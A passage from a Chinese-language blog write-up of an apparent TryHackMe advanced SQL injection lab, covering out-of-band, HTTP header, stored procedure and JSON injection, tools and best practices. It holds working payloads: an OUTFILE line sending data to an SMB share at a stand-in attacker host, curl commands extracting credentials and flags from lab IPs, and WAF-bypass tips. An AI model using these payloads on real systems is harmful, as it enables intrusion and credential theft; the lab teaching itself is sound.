<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'; SELECT @@version INTO OUTFILE '</span>\\\\ATTACKBOX_IP\\logs\\out.txt<span class="string">'; --</span></span><br></pre></td></tr></tbody></table></figure>

<p>让我们分析一下上述有效载荷：</p>
<ul>
<li><code>1'</code>：关闭 SQL 查询中的原始字符串。</li>
<li><code>;</code>：结束第一个 SQL 语句。</li>
<li><code>SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';</code>：执行新的 SQL 语句，检索数据库版本并将其写入 \ATTACKBOX_IP\logs\out.txt 处的 SMB 共享。</li>
<li><code>--</code>：注释原始 SQL 查询的其余部分以防止语法错误。</li>
</ul>
<p>要利用有效载荷，攻击者将访问在外部 SMB 共享中创建文件的 URL。</p>
<p>要访问该文件，请使用 <code>ls /tmp</code> 查看 <code>/tmp</code> 目录中收到的文件，如下所示：</p>
<p> 终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">   thm@machine$ls /tmp</span><br><span class="line">out.txt</span><br></pre></td></tr></tbody></table></figure>

<h1 id="Other-Techniques"><a href="#Other-Techniques" class="headerlink" title="Other Techniques"></a>Other Techniques</h1><p>高级 SQL 注入涉及一系列超越基本攻击的复杂方法。以下是渗透测试人员应该了解的一些重要的高级技术：</p>
<p>HTTP 标头注入</p>
<p>HTTP 标头可以携带用户输入，这些输入可能用于服务器端的 SQL 查询。</p>
<p>如果这些输入未经清理，则可能导致 SQL 注入。该技术涉及操纵 HTTP 标头（如 <strong>User-Agent</strong>、<strong>Referer</strong> 或 <strong>X-Forwarded-For</strong>）以注入 SQL 命令。服务器可能会记录这些标头或在 SQL 查询中使用它们。例如，恶意的 User-Agent 标头看起来像“User-Agent: ‘ OR 1=1; –”。如果服务器在 SQL 查询中包含 User-Agent 标头而不对其进行清理，则可能导致 SQL 注入。</p>
<p>在此示例中，Web 应用程序将 HTTP 请求中的 User-Agent 标头记录到数据库中名为 logs 的表中。应用程序在 <code>http://10.10.221.70/httpagent/</code> 处提供了一个端点，用于显示日志表中的所有已记录条目。当用户访问网页时，他们的浏览器会发送一个 User-Agent 标头，用于标识浏览器和操作系统。此标头通常用于记录日志或为特定浏览器定制内容。在我们的应用程序中，此 User-Agent 标头插入到日志表中，然后可以通过提供的端点查看。</p>
<p>给定端点，攻击者可能会尝试将 SQL 代码注入 User-Agent 标头以利用 SQL 注入漏洞。例如，通过将 User-Agent 标头设置为恶意值（如 <code>User-Agent: ' UNION SELECT username, password FROM user; --</code>），攻击者会尝试注入将日志表的结果与用户表中的敏感数据相结合的 SQL 代码。</p>
<p>以下是插入日志的服务器端代码。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="variable">$userAgent</span> = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line"><span class="variable">$insert_sql</span> = <span class="string">"INSERT INTO logs (user_Agent) VALUES ('<span class="subst">$userAgent</span>')"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$insert_sql</span>) === <span class="literal">TRUE</span>) {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p class='text-green-500'&gt;New logs inserted successfully&lt;/p&gt;"</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p class='text-red-500'&gt;Error: "</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">" (Error Code: "</span> . <span class="variable">$conn</span>-&gt;errno . <span class="string">")&lt;/p&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM logs WHERE user_Agent = '<span class="subst">$userAgent</span>'"</span>;</span><br><span class="line">..</span><br><span class="line">... </span><br></pre></td></tr></tbody></table></figure>

<p>使用 INSERT SQL 语句将 User-Agent 值插入到日志表中。如果插入成功，则会显示成功消息。如果插入过程中出现错误，则会显示包含详细信息的错误消息。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716115666836" alt="dashboard for viewing logs"></p>
<p><strong>准备有效负载</strong></p>
<p>我们将准备并将 SQL 有效负载注入 User-Agent 标头，以演示如何通过 HTTP 标头利用 SQL 注入。我们的目标有效负载将是 ‘ UNION SELECT username, password FROM user; #。此有效负载旨在：</p>
<ul>
<li><strong>关闭现有字符串文字</strong>：初始单引号 (<code>'</code>) 用于关闭 SQL 查询中的现有字符串文字。</li>
<li><strong>注入 UNION SELECT 语句</strong>：有效负载的 <code>UNION SELECT username, password FROM user;</code> 部分用于从用户表中检索用户名和密码列。</li>
<li><strong>注释掉查询的其余部分</strong>：<code>#</code> 字符用于注释掉 SQL 查询的其余部分，确保忽略任何后续 SQL 代码。</li>
</ul>
<p>我们需要将此有效负载作为 HTTP 请求中的 User-Agent 标头的一部分发送以注入此有效负载，这可以使用 <strong>Burp Suite</strong> 或 <strong>cURL</strong> 等工具来完成。我们将使用 curl 命令行工具发送带有自定义 User-Agent 标头的 HTTP 请求。打开终端并访问命令行界面。使用以下命令发送带有自定义“User-Agent”标头的请求：</p>
<p> 示例终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@tryhackme$ curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.10.221.70/httpagent/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset="UTF-8"&gt;</span><br><span class="line">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</span><br><span class="line">    &lt;title&gt;SQL Injection &lt;/title&gt;</span><br><span class="line"> rel="stylesheet"&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class="bg-gray-100"&gt;</span><br><span class="line">    &lt;div class="container mx-auto p-8"&gt;</span><br><span class="line">        &lt;h1 class="text-4xl font-bold mb-8 text-center"&gt;HTTP Logs&lt;/h1&gt;</span><br><span class="line">        &lt;div class="bg-white p-6 rounded-lg shadow-lg"&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class='text-gray-600 text-sm mb-4'&gt;Generated SQL Query: &lt;span class='text-red-500'&gt;SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'&lt;/span&gt;&lt;/p&gt;&lt;div class='p-4 bg-gray-100 rounded shadow mb-4'&gt;&lt;p class='font-bold'&gt;id: &lt;span class='text-gray-700'&gt;bob&lt;/span&gt;&lt;/p&gt;&lt;p class='font-bold'&gt;user_Agent: &lt;span class='text-gray-700'&gt;bob@123&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;div class='p-4 bg-gray-100 rounded shadow mb-4'&gt;&lt;p class='font-bold'&gt;id: &lt;span class='text-gray-700'&gt;attacker&lt;/span&gt;&lt;/p&gt;&lt;p class='font-bold'&gt;user_Agent: &lt;span class='text-gray-700'&gt;tesla&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>服务器的响应将显示在终端中。如果 SQL 注入成功，您将在响应中看到提取的数据（用户名和密码）。</p>
<p>利用存储过程</p>
<p>存储过程是存储在数据库中的例程，可以执行各种操作，例如插入、更新或查询数据。虽然存储过程可以帮助提高性能并确保一致性，但如果处理不当，它们也可能容易受到 SQL 注入的攻击。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785792" alt="process flow of stored procedure"></p>
<p>存储过程是预编译的 SQL 语句，可以作为单个单元执行。它们存储在数据库中，可以由应用程序调用来执行特定任务。存储过程可以接受参数，这可以使它们灵活而强大。但是，如果这些参数没有得到适当的清理，它们可能会引入 SQL 注入漏洞。</p>
<p>考虑一个旨在根据用户名检索用户数据的存储过程：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> CREATE PROCEDURE sp_getUserData</span><br><span class="line">    @username <span class="title function_ invoke__">NVARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">AS</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE @sql <span class="title function_ invoke__">NVARCHAR</span>(<span class="number">4000</span>)</span><br><span class="line">    SET @sql = <span class="string">'SELECT * FROM users WHERE username = '</span><span class="string">''</span> + @username + <span class="string">''</span><span class="string">''</span></span><br><span class="line">    <span class="title function_ invoke__">EXEC</span>(@sql)</span><br><span class="line">END</span><br></pre></td></tr></tbody></table></figure>

<p>在此示例中，存储过程将 @username 参数连接到动态 SQL 查询中。这种方法容易受到 SQL 注入攻击，因为输入未经清理。</p>
<p>XML 和 JSON 注入</p>
<p>如果应用程序没有正确清理输入，解析 XML 或 JSON 数据并在 SQL 查询中使用解析后的数据，则容易受到注入攻击。 XML 和 JSON 注入涉及将恶意数据注入 XML 或 JSON 结构，然后将其用于 SQL 查询。如果应用程序直接在 SQL 语句中使用解析后的值，则可能会发生这种情况。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> {</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin' OR '1'='1--"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"password"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>如果应用程序在 SQL 查询中直接使用这些值（如“SELECT * FROM users WHERE username = ‘admin’ OR ‘1’=’1’– AND password = ‘password’”），则可能会导致注入。</p>
<h2 id="books表中-book-id-1-的标志字段的值是什么？"><a href="#books表中-book-id-1-的标志字段的值是什么？" class="headerlink" title="books表中 book_id =1 的标志字段的值是什么？"></a>books表中 book_id =1 的标志字段的值是什么？</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl -H "User-Agent: ' UNION SELECT flag , book_id FROM books;#" http://10.10.61.196/httpagent/</span><br></pre></td></tr></tbody></table></figure>

<h2 id="提取用户代理时，服务器端检测哪个字段？"><a href="#提取用户代理时，服务器端检测哪个字段？" class="headerlink" title="提取用户代理时，服务器端检测哪个字段？"></a>提取用户代理时，服务器端检测哪个字段？</h2><p>User-Agent</p>
<h1 id="Automation"><a href="#Automation" class="headerlink" title="Automation"></a>Automation</h1><p>由于安全措施实施不当以及不同 Web 框架的复杂性，SQL 注入仍然是一种常见威胁<em>。</em>自动识别和利用这些漏洞可能具有挑战性，但已经开发了多种工具和技术来帮助简化此过程。</p>
<p>识别过程中的主要问题</p>
<p>识别 SQL 注入漏洞涉及几个挑战，类似于识别任何其他服务器端漏洞。以下是关键问题：</p>
<ul>
<li><strong>SQL 查询的动态性质</strong>：SQL 查询可以动态构建，因此很难检测到注入点。具有多层逻辑的复杂查询可能会掩盖潜在的漏洞。</li>
<li><strong>各种注入点</strong>：SQL 注入可能发生在应用程序的不同部分，包括输入字段、HTTP 标头和 URL 参数。识别所有潜在注入点需要彻底的测试和对应用程序的全面了解。</li>
<li><strong>使用安全措施</strong>：应用程序可能使用准备好的语句、参数化查询和 ORM 框架，这些可以防止 SQL 注入。自动化工具必须能够区分安全和不安全的查询构造。</li>
<li><strong>上下文特定检测</strong>：用户输入在 SQL 查询中使用的上下文可能千差万别。工具必须适应不同的上下文才能准确识别漏洞。</li>
</ul>
<p>一些重要的工具</p>
<p>安全社区内已经开发了几种知名的工具和项目来帮助自动查找 SQL 注入漏洞。以下是一些提供检测和利用 SQL 注入功能的知名工具和 GitHub 存储库：</p>
<ul>
<li>**<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">SQLMap</a>**：SQLMap 是一种开源工具，可自动检测和利用 Web 应用程序中的 SQL 注入漏洞。它支持多种数据库，并为识别和利用提供了广泛的选项。您可以在 <a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/sqlmap">此处</a> 了解有关该工具的更多信息。</li>
<li>**<a target="_blank" rel="noopener" href="https://github.com/xxgrunge/sqlninja">SQLNinja</a>**：SQLNinja 是一种专门设计用于利用使用 Microsoft SQL Server 作为后端数据库的 Web 应用程序中的 SQL 注入漏洞的工具。它可以自动执行各种利用阶段，包括数据库指纹识别和数据提取。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/43622283/jsql-injection"><strong>JSQL Injection</strong></a>：一个专注于检测 Java 应用程序中的 SQL 注入漏洞的 Java 库。它支持各种类型的 SQL 注入攻击，并提供一系列用于提取数据和控制数据库的选项。</li>
<li>**<a target="_blank" rel="noopener" href="https://github.com/CiscoCXSecurity/bbqsql">BBQSQL</a>**：BBQSQL 是一个盲 SQL 注入利用框架，旨在简单高效地自动利用盲 SQL 注入漏洞。</li>
</ul>
<p>自动识别和利用 SQL 注入漏洞对于维护 Web 应用程序安全至关重要。 SQLMap、SQLNinja 和 BBQSQL 等工具提供了强大的功能来检测和利用这些漏洞。但是，了解自动化工具的局限性以及手动分析和验证的必要性以确保全面的安全覆盖非常重要。通过将这些工具集成到您的安全工作流程中并遵循输入验证和查询构造的最佳实践，您可以有效地减轻与 SQL 注入漏洞相关的风险。</p>
<h1 id="Best-Practices"><a href="#Best-Practices" class="headerlink" title="Best Practices"></a>Best Practices</h1><p>SQL 注入是一种著名且普遍存在的漏洞，多年来一直是 Web 应用程序安全的主要问题。渗透测试人员在评估过程中必须特别注意此漏洞，因为它需要彻底了解各种技术才能识别和利用 SQL 注入点。同样，安全编码人员必须优先保护其应用程序，实施强大的输入验证并遵守安全编码实践以防止此类攻击。下面提到了一些最佳实践：</p>
<p>安全编码人员</p>
<ul>
<li><strong>参数化查询和准备好的语句</strong>：使用参数化查询和准备好的语句确保所有用户输入都被视为数据而不是可执行代码。此技术通过将查询结构与数据分离来帮助防止 SQL 注入。例如，在带有 PDO 的 PHP 中，您可以准备一个语句并绑定参数，以确保用户输入得到安全处理，如 <code>$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username"); $stmt-&gt;execute(['username' =&gt; $username]);</code>。</li>
<li><strong>输入验证和清理</strong>：实施强大的输入验证和清理，以确保输入符合预期格式。验证数据类型、长度和范围，并拒绝任何不符合这些标准的输入。使用 PHP 中的内置函数（如 <code>htmlspecialchars()</code> 和 <code>filter_var()</code>）有效地清理输入。</li>
<li><strong>最小特权原则</strong>：通过授予应用程序帐户必要的最低数据库权限来应用最小特权原则。避免使用具有管理权限的数据库帐户进行日常操作。通过限制攻击者对关键数据库功能的访问，这可以最大限度地减少成功的 SQL 注入攻击的潜在影响。</li>
<li><strong>存储过程</strong>：使用存储过程封装和验证 SQL 逻辑。这允许您控制和验证数据库本身内的输入，从而降低 SQL 注入的风险。确保存储过程仅接受经过验证的输入，并设计为在内部处理输入清理。</li>
<li><strong>定期安全审计和代码审查</strong>：进行定期安全审计和代码审查以识别和解决漏洞。自动化工具可以帮助扫描 SQL 注入风险，但人工审核对于发现细微问题也至关重要。定期审核可确保您的安全实践与不断发展的威胁保持同步。</li>
</ul>
<p>渗透测试人员</p>
<ul>
<li><strong>利用数据库特定功能</strong>：不同的数据库管理系统 (DBMS) 具有独特的功能和语法。渗透测试人员应了解目标 DBMS（例如 MySQL、PostgreSQL、Oracle、MSSQL）的具体情况，以有效利用这些功能。例如，MSSQL 支持 <code>xp_cmdshell</code> 命令，可用于执行系统命令。</li>
<li><strong>利用错误消息</strong>：利用详细的错误消息来深入了解数据库架构和结构。基于错误的 SQL 注入涉及诱使应用程序生成显示有用信息的错误消息。例如，使用 1’ AND 1=CONVERT(int, (SELECT @@version)) – 可能会生成泄露版本信息的错误。</li>
<li><strong>绕过 WAF 和过滤器</strong>：测试各种混淆技术以绕过 Web 应用程序防火墙 (WAF) 和输入过滤器。这包括使用混合大小写 (SeLeCt)、连接 (CONCAT(CHAR(83)、CHAR(69)、CHAR(76)、CHAR(69)、CHAR(67)、CHAR(84))) 和替代编码 (十六进制、URL 编码)。此外，使用内联注释 (/**/) 和不同的字符编码 (例如 %09、%0A) 可以帮助绕过简单的过滤器。</li>
<li><strong>数据库指纹识别</strong>：确定数据库的类型和版本以定制攻击。这可以通过发送根据 DBMS 产生不同结果的特定查询来完成。例如，SELECT version() 适用于 PostgreSQL，而 SELECT @@version 适用于 MySQL 和 MSSQL。</li>
<li><strong>使用 SQL 注入进行透视</strong>：使用 SQL 注入来透视和利用网络的其他部分。一旦数据库服务器被入侵，它就可以用来访问其他内部系统。这可能涉及提取凭据或利用系统之间的信任关系。</li>
</ul>
<p>高级 SQL 注入测试需要深入了解各种技术，并具备适应不同环境的能力。渗透测试人员应采用各种方法，从利用特定于数据库的功能到绕过复杂的过滤器，再到彻底评估和利用 SQL 注入漏洞。有条不紊地记录每个步骤可确保对应用程序的安全性进行全面评估。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn/2024/06/15/AdvancedSQLInjectionTHM/">https://blog.mikannse.cn/2024/06/15/AdvancedSQLInjectionTHM/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.mikannse.cn" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/">溯源取证</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/18/TSharkTheBasicsTHM/" title="TSharkTheBasicsTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TSharkTheBasicsTHM</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/14/TemplatesTHM/" title="TemplatesTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TemplatesTHM</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/05/27/IntrotoLogAnalysisTHM/" title="IntrotoLogAnalysisTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-27</div><div class="title">IntrotoLogAnalysisTHM</div></div></a></div><div><a href="/2024/06/18/TSharkTheBasicsTHM/" title="TSharkTheBasicsTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-18</div><div class="title">TSharkTheBasicsTHM</div></div></a></div><div><a href="/2023/09/13/CVE-2016-4437shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2016-4437shiro反序列化漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-13</div><div class="title">CVE-2016-4437shiro反序列化漏洞复现</div></div></a></div><div><a href="/2025/04/24/CVE-2021-44228Log4j%E5%A4%8D%E7%8E%B0/" title="CVE-2021-44228Log4j复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-24</div><div class="title">CVE-2021-44228Log4j复现</div></div></a></div><div><a href="/2024/04/06/CVE-2019-11043PHP-FPM%E8%BF%9C%E7%A8%8BRCE%E5%A4%8D%E7%8E%B0/" title="CVE-2019-11043PHP-FPM远程RCE复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-06</div><div class="title">CVE-2019-11043PHP-FPM远程RCE复现</div></div></a></div><div><a href="/2024/03/14/ContainerVulnerabilitiesTHM/" title="ContainerVulnerabilitiesTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">ContainerVulnerabilitiesTHM</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">347</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">77</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Quick-Recap"><span class="toc-number">2.</span> <span class="toc-text">Quick Recap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Second-Order-SQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">Second-Order SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86%E6%89%80%E6%9C%89%E4%B9%A6%E7%B1%8D%E7%9A%84%E6%A0%87%E9%A2%98%E6%9B%B4%E6%96%B0%E4%B8%BA%E2%80%9Ccompromised%E2%80%9D%E5%90%8E%EF%BC%8C%E6%A0%87%E5%BF%97%E5%80%BC%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">将所有书籍的标题更新为“compromised”后，标志值是多少？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%97%A6%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E5%88%A0%E9%99%A4%E8%A1%A8-hello%EF%BC%8C%E6%A0%87%E5%BF%97%E5%80%BC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">3.2.</span> <span class="toc-text">一旦从数据库中删除表 hello，标志值是什么？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filter-Evasion-Techniques"><span class="toc-number">4.</span> <span class="toc-text">Filter Evasion Techniques</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filter-Evasion-Techniques-continued"><span class="toc-number">5.</span> <span class="toc-text">Filter Evasion Techniques (continued)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Out-of-band-SQL-Injection"><span class="toc-number">6.</span> <span class="toc-text">Out-of-band SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Other-Techniques"><span class="toc-number">7.</span> <span class="toc-text">Other Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#books%E8%A1%A8%E4%B8%AD-book-id-1-%E7%9A%84%E6%A0%87%E5%BF%97%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">books表中 book_id &#x3D;1 的标志字段的值是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86%E6%97%B6%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%AA%E4%B8%AA%E5%AD%97%E6%AE%B5%EF%BC%9F"><span class="toc-number">7.2.</span> <span class="toc-text">提取用户代理时，服务器端检测哪个字段？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Automation"><span class="toc-number">8.</span> <span class="toc-text">Automation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Best-Practices"><span class="toc-number">9.</span> <span class="toc-text">Best Practices</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/25/%E5%AE%89%E5%8D%93App%E6%B8%97%E9%80%8F%E7%9C%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="安卓App渗透真机环境配置">安卓App渗透真机环境配置</a><time datetime="2025-07-25T08:29:36.000Z" title="发表于 2025-07-25 16:29:36">2025-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/15/25-6%E6%9D%82%E8%B0%88/" title="25-6杂谈">25-6杂谈</a><time datetime="2025-07-15T06:10:16.000Z" title="发表于 2025-07-15 14:10:16">2025-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/kaggleIntermediateMachineLearning%E7%BC%BA%E5%A4%B1%E5%80%BC/" title="kaggleIntermediateMachineLearning缺失值">kaggleIntermediateMachineLearning缺失值</a><time datetime="2025-07-01T11:31:19.000Z" title="发表于 2025-07-01 19:31:19">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/kaggleIntermediateMachineLearningIntroduction/" title="kaggleIntermediateMachineLearningIntroduction">kaggleIntermediateMachineLearningIntroduction</a><time datetime="2025-07-01T11:28:32.000Z" title="发表于 2025-07-01 19:28:32">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/THMTheLayoftheLand/" title="THMTheLayoftheLand">THMTheLayoftheLand</a><time datetime="2025-06-13T08:52:38.000Z" title="发表于 2025-06-13 16:52:38">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
